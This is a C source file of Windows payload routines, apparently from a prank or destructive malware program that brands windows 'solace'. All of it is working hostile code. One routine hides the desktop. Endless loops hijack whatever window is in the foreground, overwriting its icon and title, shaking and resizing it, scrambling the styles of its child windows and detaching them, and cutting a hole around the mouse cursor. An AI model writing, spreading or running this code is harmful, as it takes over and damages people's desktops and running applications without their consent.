#include "dec.h"
#include "resource.h"

int WindowTrails(void) {
	HWND pwh = FindWindow(L"Progman", NULL);

	SetWindowRgn(pwh, CreateRectRgn(0, 0, 0, 0), TRUE);

	return 0;
}

DWORD WINAPI WindowFucker(LPVOID lParam) {
	HWND fwh;
	RECT fwd;

	while (TRUE) {
		fwh = GetForegroundWindow();

		SendMessage(fwh, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_APPICON)));

		SendMessage(fwh, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_APPICON)));

		SetWindowText(fwh, L"solace");

		GetWindowRect(fwh, &fwd);

		MoveWindow(fwh, fwd.left + random_r(-5, 5), fwd.top + random_r(-5, 5), (fwd.right - fwd.left) + random_r(-5, 5), (fwd.bottom - fwd.top) + random_r(-5, 5), FALSE);

		EnumChildWindows(fwh, &WindowFuckerProc, 0);

		Sleep(random() % 3000);
	}

	return 0;
}

BOOL CALLBACK WindowFuckerProc(HWND hwnd, LPARAM lParam) {
	RECT fwd;

	SetWindowLong(hwnd, GWL_STYLE, random() % LONG_MAX);

	SetWindowLong(hwnd, GWL_EXSTYLE, random() % LONG_MAX);

	SendMessage(hwnd, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_APPICON)));

	SendMessage(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_APPICON)));

	SetWindowText(hwnd, L"solace");

	GetWindowRect(hwnd, &fwd);

	MoveWindow(hwnd, fwd.left + random_r(-5, 5), fwd.top + random_r(-5, 5), (fwd.right - fwd.left) + random_r(-5, 5), (fwd.bottom - fwd.top) + random_r(-5, 5), FALSE);

	SetParent(hwnd, NULL);

	return TRUE;
}

DWORD WINAPI CreateHoleAroundCursor(LPVOID lParam) {
	int cx;
	int cy;
	HRGN wr;
	HRGN hr;
	HWND fwh;
	RECT fwd;
	POINT cc;

	while (TRUE) {
		fwh = GetForegroundWindow();

		GetWindowRect(fwh, &fwd);

		GetCursorPos(&cc);

		cx = cc.x - fwd.left;
		cy = cc.y - fwd.top;

		wr = CreateRectRgn(0, 0, fwd.right - fwd.left, fwd.bottom - fwd.top);

		hr = CreateEllipticRgn(cx - 32, cy - 32, cx + 32, cy + 32);

		CombineRgn(wr, wr, hr, RGN_XOR);

		SetWindowRgn(fwh, wr, FALSE);

		Sleep(1);
	}

	return 0;
}